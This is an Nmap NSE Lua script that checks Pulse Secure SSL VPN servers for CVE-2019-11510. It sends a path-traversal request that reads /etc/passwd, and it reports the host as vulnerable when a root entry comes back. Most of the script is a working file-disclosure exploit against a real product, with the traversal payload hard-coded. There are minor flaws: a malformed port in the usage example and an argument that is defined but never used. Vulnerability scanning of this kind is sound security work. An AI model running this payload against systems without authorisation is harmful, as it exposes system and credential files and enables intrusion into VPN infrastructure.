description = [[
Pulse Secure SSL VPN file disclosure via specially crafted HTTP resource requests.
This exploit reads /etc/passwd as a proof of concept
This vulnerability affect ( 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4
]]

local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"
local string = require "string"

---
-- @usage
-- nmap -p <port> --script pulse_ssl_vpn <target>
--
-- @output
-- PORT    STATE SERVICE
-- s4430/tcp  open  http
-- | http-vuln-cve2019-11510:
-- |   VULNERABLE
-- |   Pulse Secure SSL VPN file disclosure via specially crafted HTTP resource requests
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2019-11510
-- |
-- |     Disclosure date: 2019-04-24
-- |     References:
-- |      http://www.securityfocus.com/bid/108073 
-- |      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510
-- |_     http://packetstormsecurity.com/files/154176/Pulse-Secure-SSL-VPN-8.1R15.1-8.2-8.3-9.0-Arbitrary-File-Disclosure.html 
--
-- @args http-vuln-cve2019-11510.method The HTTP method for the request. The default method is "GET".
-- @args http-vuln-cve2019-11510.path The URL path to request. The default path is "/".

author = "r00tpgp"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln" }

portrule = shortport.http

action = function(host, port)
  local vuln = {
    title = "Pulse Secure SSL VPN file disclosure via specially crafted HTTP resource requests",
    state = vulns.STATE.NOT_VULN,
    description = [[
Pulse Secure SSL VPN file disclosure via specially crafted HTTP resource requests. 
This exploit reads /etc/passwd as a proof of concept
This vulnerability affect ( 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4
    ]],
    IDS = {
        CVE = "CVE-2019-11510"
    },
    references = {
        'http://www.securityfocus.com/bid/108073',
	'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510',
        'http://packetstormsecurity.com/files/154176/Pulse-Secure-SSL-VPN-8.1R15.1-8.2-8.3-9.0-Arbitrary-File-Disclosure.html'
    },
    dates = {
        disclosure = { year = '2019', month = '04', day = '24' }
    }
  }

   -- Send a simple GET request to the server, if it returns appropiate string, then you have a vuln host
 options = {header={}}    options['header']['User-Agent'] = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"    
 --local req = http.get(host, port, uri, options) 
 local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
 local url = stdnse.get_script_args(SCRIPT_NAME..".url") or "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"
 local response = http.generic_request(host, port, "GET", "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/", options)

 if response.status == 200 and string.match(response.body, "root:x:0:0:root:/:/bin/bash")  then
 -- if response.status == 200 then
 vuln.state = vulns.STATE.VULN
 end

 return vuln_report:make_output(vuln)
end
